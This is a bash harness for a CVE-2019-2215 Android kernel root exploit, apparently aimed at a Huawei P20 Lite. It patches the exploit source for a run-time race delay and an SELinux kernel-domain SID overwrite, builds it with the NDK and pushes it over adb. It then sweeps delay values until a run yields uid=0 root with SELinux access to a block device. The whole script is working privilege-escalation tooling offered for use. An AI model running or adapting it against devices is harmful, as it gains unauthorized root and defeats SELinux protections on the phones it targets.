#!/bin/bash
# One build, many delay values: apply the runtime-DELAY patch plus the SELinux
# cred-SID patch, build once, then sweep the delay from argv without rebuilding.
#
# Why a single build matters: in this exploit every rebuild shifts the compiled
# layout and with it the effective race window, so a compiled-in sweep is
# re-tuning the binary at every step. Reading the delay from argv keeps the
# binary fixed and makes the delay the only variable.
set -u
cd /home/placeless/dev/p20lite-cve
NDK=$(ls -d ~/Android/Sdk/ndk/*/ 2>/dev/null | head -1)

echo "############ 1. use the CURRENT sources as they are (both patches in place)"
grep -c "set_sid(cred_addr, KERNEL_DOMAIN_SID)" exploit/cve_2019_2215.c || true
grep -c "^unsigned int g_delay" exploit/cve_2019_2215.c || true

echo
echo "############ 2. make DELAY settable at run time"
python3 /home/placeless/dev/p20-root/apply_rtdelay.py
grep -n "g_delay" exploit/cve_2019_2215.c | head -6

echo
echo "############ 3. build once"
${NDK}ndk-build -j4 NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk \
    APP_PLATFORM=android-28 APP_ABI=arm64-v8a 2>&1 | tail -2
ls -la libs/arm64-v8a/cve-2019-2215
timeout 60 adb push libs/arm64-v8a/cve-2019-2215 /data/local/tmp/cve-2019-2215 2>&1 | tail -1
timeout 30 adb shell 'chmod 755 /data/local/tmp/cve-2019-2215'

echo
echo "############ 4. sweep the delay at run time"
for D in 10 25 50 100 200 400 800 1600; do
  printf '%s\n' "$D"
  printf 'id\ncat /proc/self/attr/current\nblockdev --getsize64 /dev/block/bootdevice/by-name/nvme 2>&1\n' \
    | timeout 150 adb shell /data/local/tmp/cve-2019-2215 "$D" > "/tmp/rt_$D.out" 2>&1
  if grep -aq "uid=0(root)" "/tmp/rt_$D.out"; then
    echo "  >>>>>> ROOT at DELAY=$D"
    echo "  --- SELinux and access result ---"
    grep -anE "forced|context|blockdev|Permission|Enforcing" "/tmp/rt_$D.out" | tail -8
    if ! grep -aq "Permission denied" "/tmp/rt_$D.out"; then
      echo "  >>>>>> ACCESS GRANTED at DELAY=$D <<<<<<"
      echo "$D" > /tmp/winning_rt_delay.txt
      cp "/tmp/rt_$D.out" /tmp/rt_success.out
      break
    fi
  else
    echo "  no root ($(tail -1 /tmp/rt_$D.out | cut -c1-50))"
  fi
done

echo
echo "=== winner: $(cat /tmp/winning_rt_delay.txt 2>/dev/null || echo none) ==="
